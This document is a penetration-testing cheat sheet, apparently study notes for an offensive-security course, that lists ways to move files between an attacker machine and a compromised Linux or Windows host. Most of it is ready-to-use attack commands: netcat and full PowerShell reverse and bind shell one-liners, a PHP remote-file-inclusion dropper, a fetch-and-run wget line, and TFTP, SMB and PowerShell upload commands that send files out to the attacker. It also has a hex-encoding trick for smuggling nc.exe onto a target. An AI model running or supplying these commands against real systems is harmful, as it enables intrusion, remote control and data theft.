## Linux

### FTP

- Commands

	- Transfer an executable file (vba-exe)

		- ftp > binary

	- Transfer "readable" content

		- ftp > ascii

	- FTP Server

		- apt-get install python-pyftpdlib
		- python -m pyftpdlib -p 21 -w

- [URL](https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files)

### Python

- python -m simpleHTTPServer $PORT

### NC

- nc -nv  $IP $PORT
- nc -nlvp $PORT
- nc -nlvp $PORT > incoming.exe
-`nc -nv $IP $PORT < /usr/share/windows-resources/binaries/wget.exe

- Bind

	- nc -nlvp $PORT -e cmd.exe
	- nc -nv $IP $PORT

- Reverse

	- nc -nlvp $PORT
	- nc -nv $IP $PORT -e /bin/bash

### TFTP

- service atftpd start
- tftp -i $IP GET met8888.exe
- tftp -i $IP PUT C:\bank-account.zip
- pkgmgr /iu:"TFTP"

### SMB Server

- smbserver.py $MY_DIRECTORY .
- copy \\$IP\$MY_DIRECTORY\setup.msi C:\Temp
- [Windows Protocols](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/102bd261-c45e-45a2-b343-cee88faf4abe)

### PHP - RFI

```
<?php
$encoded = 'PUT_BASE64_ENCODED_FILE_HERE';
$file = '/tmp/findsock';
$fp = fopen($file, 'wb');
fwrite($fp, base64_decode($encoded));
fclose($fp);
system("chmod 0777 " . $file);
echo system("ls -la /tmp");
?>
```

### WGET

- cd /tmp && wget -O exploit.php $IP/exploit.php && php -f exploit.php

### SSH

- PUT

	- ssh root@$IP "cat proof.txt" < proof.txt

- GET

	- ssh root@$IP "cat exploit" > exploit

### ATFTP

- apt update && sudo apt install atftp
- mkdir /tftp
- chown nobody: /tftp
- atftpd --daemon --port 69 /tftp
- c> tftp -i $IP put important.docx


## Windows

### Powershell

- Set-ExecutionPolicy Unrestricted
- Get-ExecutionPolicy
- File Transfer

	- powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /$IP/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

- Reverse shell

	- nc -nlvp $PORT
  - powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" 


- Bind

	- nc -nv $IP $PORT
  - powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"

### SMBServer
- Copying a file from a client to a share
    -  C:\> copy text.txt y:\text.txt
- Command to copy y:\text.txt to the current directory
    -  C:\> copy y:\text.txt .
- [URL](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/7b067a41-5f3e-4010-85bd-4b3cb6e474c2)
	

### Upload File

- Commands
    - service apache2 start
		- mkdir /var/www/html/web/uploads
		- chown www-data:www-data /var/www/html/web/uploads
		- chmod 766 /var/www/html/web/uploads
		- powershell -nop -exec bypass Invoke-RestMethod -Uri http://$IP/web/upload.php -Method Post -Infile 'c:\<Path to the Target File>'
		- powershell (New-Object System.Net.WebClient).UploadFile('http://$IP/upload.php', 'important.docx')
		
- [URL](https://medium.com/bugbountywriteup/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9)

### exe2hex
- exe2hex nc.exe -p nc.cmd
  - powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
  - powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"

### Reduce the file size

	- upx -9 nc.exe
